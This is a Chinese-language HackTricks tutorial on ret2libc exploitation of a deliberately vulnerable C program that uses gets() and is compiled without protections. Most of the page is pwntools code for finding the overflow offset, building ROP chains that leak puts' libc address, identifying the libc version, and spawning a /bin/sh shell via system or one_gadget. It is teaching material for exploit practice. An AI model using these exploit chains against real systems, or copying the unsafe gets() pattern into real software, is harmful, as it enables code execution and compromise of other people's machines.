<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我在**推特**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>


# 快速简介

1. **找到**溢出**偏移量**
2. **找到**`POP_RDI`，`PUTS_PLT`和`MAIN_PLT`的gadgets
3. 使用前面的gadgets来**泄漏puts或其他libc函数的内存地址**并**找到libc版本**（[下载地址](https://libc.blukat.me)）
4. 使用库来**计算ROP并利用它**

# 其他教程和二进制文件供练习

本教程将利用此教程中提供的代码/二进制文件进行利用：[https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
其他有用的教程：[https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/)，[https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

# 代码

文件名：`vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector  -no-pie
```
# ROP - 泄露 LIBC 模板

我将使用此处的代码来制作漏洞利用。\
下载漏洞利用并将其放置在与易受攻击的二进制文件相同的目录中，并向脚本提供所需的数据：

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# 1- 查找偏移量

在继续进行漏洞利用之前，模板需要一个偏移量。如果没有提供偏移量，它将执行必要的代码来查找它（默认情况下 `OFFSET = ""`）：
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**执行** `python template.py` 将打开一个带有崩溃程序的 GDB 控制台。在该 **GDB 控制台** 中执行 `x/wx $rsp` 以获取将要覆盖 RIP 的 **字节**。最后，在 **python 控制台** 中获取 **偏移量**：
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../.gitbook/assets/image (140).png>)

在找到偏移量（在本例中为40）后，使用该值更改模板中的OFFSET变量。\
`OFFSET = "A" * 40`

另一种方法是使用：`pattern create 1000` -- _execute until ret_ -- `pattern seach $rsp` from GEF。

# 2- 寻找Gadgets

现在我们需要在二进制文件中找到ROP gadgets。这些ROP gadgets将用于调用`puts`函数来找到正在使用的**libc**，然后用于**启动最终的攻击**。
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
`PUTS_PLT`是调用**puts函数**所需的。\
`MAIN_PLT`是在一次交互后再次调用**主函数**以便再次**利用**溢出（无限次的利用）。**它在每个ROP的末尾用于再次调用程序**。\
**POP\_RDI**用于将**参数**传递给被调用的函数。

在这一步中，您不需要执行任何操作，因为在执行过程中，pwntools将找到所有所需的内容。

# 3- 查找LIBC库

现在是时候找出正在使用的**libc库**的版本了。为此，我们将**泄漏**内存中**puts函数**的**地址**，然后我们将在该地址中搜索puts版本所在的**库版本**。
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
要做到这一点，执行代码中最重要的一行是：
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
这将发送一些字节，直到**覆盖** **RIP** 成为可能：`OFFSET`。\
然后，它将设置`POP_RDI`小工具的**地址**，以便下一个地址（`FUNC_GOT`）将保存在**RDI**寄存器中。这是因为我们想要**调用puts**，并将`PUTS_GOT`的**地址**作为puts函数在内存中的地址保存在`PUTS_GOT`指向的地址中。\
之后，将调用`PUTS_PLT`（将`PUTS_GOT`放入**RDI**中），因此puts将**读取**`PUTS_GOT`中的内容（**puts函数在内存中的地址**）并将其**打印出来**。\
最后，再次调用**main函数**，以便我们可以再次利用溢出。

这样，我们成功欺骗了puts函数，使其**打印出**位于**libc**库中的**puts函数的内存地址**。现在，我们有了该地址，我们可以**搜索正在使用的libc版本**。

![](<../../../.gitbook/assets/image (141).png>)

由于我们正在**利用**一些**本地**二进制文件，因此**不需要**找出正在使用的**libc**版本（只需在`/lib/x86_64-linux-gnu/libc.so.6`中找到该库）。\
但是，在远程利用的情况下，我将在这里解释如何找到它：

## 3.1- 搜索libc版本（1）

您可以在网页上搜索正在使用的库：[https://libc.blukat.me/](https://libc.blukat.me)\
它还允许您下载发现的**libc**版本

![](<../../../.gitbook/assets/image (142).png>)

## 3.2- 搜索libc版本（2）

您还可以执行以下操作：

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

这需要一些时间，请耐心等待。\
为了使其工作，我们需要：

* Libc符号名称：`puts`
* 泄漏的libc地址：`0x7ff629878690`

我们可以找出最有可能使用的**libc**版本。
```
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
我们找到了2个匹配项（如果第一个不起作用，您可以尝试第二个）。下载第一个：
```
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
将`libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so`中的libc复制到我们的工作目录中。

## 3.3- 用于泄漏的其他函数
```python
puts
printf
__libc_start_main
read
gets
```
# 4- 寻找基于libc的地址并进行利用

在这一步中，我们应该知道使用的libc库。由于我们正在利用本地二进制文件，我将只使用：`/lib/x86_64-linux-gnu/libc.so.6`

因此，在`template.py`的开头，将**libc**变量更改为：`libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #当知道路径时设置库路径`

将**libc库的路径**提供给**exploit的其余部分将自动计算**。

在`get_addr`函数内，将计算**libc的基地址**：
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
请注意，**最终的libc基地址必须以00结尾**。如果不是这种情况，可能会泄漏错误的库。
{% endhint %}

然后，函数`system`的地址和字符串"/bin/sh"的**地址**将从**libc的基地址**和给定的**libc库**中进行**计算**。
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
最后，将准备好的/bin/sh执行漏洞利用发送出去：
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
让我们解释一下这个最终的ROP。

最后一个ROP（`rop1`）再次调用了main函数，因此我们可以再次利用溢出漏洞（这就是为什么`OFFSET`再次出现的原因）。然后，我们想要调用`POP_RDI`指向"/bin/sh"的地址（`BINSH`），并调用system函数（`SYSTEM`），因为"/bin/sh"的地址将作为参数传递。

最后，调用exit函数的地址，以便进程正常退出，不会生成任何警报。

这样，利用程序将执行一个"/bin/sh" shell。

![](<../../../.gitbook/assets/image (143).png>)

# 4(2)- 使用ONE_GADGET

您还可以使用[ONE_GADGET](https://github.com/david942j/one_gadget)来获取一个shell，而不是使用system和"/bin/sh"。ONE_GADGET将在libc库中找到一种只使用一个ROP地址就能获取shell的方法。

然而，通常会有一些限制条件，最常见且容易避免的是`[rsp+0x30] == NULL`。由于您可以控制RSP中的值，只需发送更多的NULL值即可避免这个限制条件。

![](<../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
# EXPLOIT文件

您可以在此处找到利用此漏洞的模板：

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# 常见问题

## 未找到MAIN_PLT = elf.symbols\['main']

如果找不到"main"符号。那么您可以查看主要代码的位置：
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
并手动设置地址：
```python
MAIN_PLT = 0x401080
```
## 找不到Puts函数

如果二进制文件没有使用Puts函数，你应该检查是否使用了

## `sh: 1: %s%s%s%s%s%s%s%s: not found`

如果在创建所有的攻击载荷之后，你发现了这个**错误**：`sh: 1: %s%s%s%s%s%s%s%s: not found`

尝试**从"/bin/sh"的地址中减去64个字节**：
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？你想在 HackTricks 中看到你的**公司广告**吗？或者你想获得**PEASS 的最新版本或下载 HackTricks 的 PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获得[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)

- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者在 **Twitter** 上 **关注**我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向 [hacktricks 仓库](https://github.com/carlospolop/hacktricks) 和 [hacktricks-cloud 仓库](https://github.com/carlospolop/hacktricks-cloud) 提交 PR 来分享你的黑客技巧**。

</details>
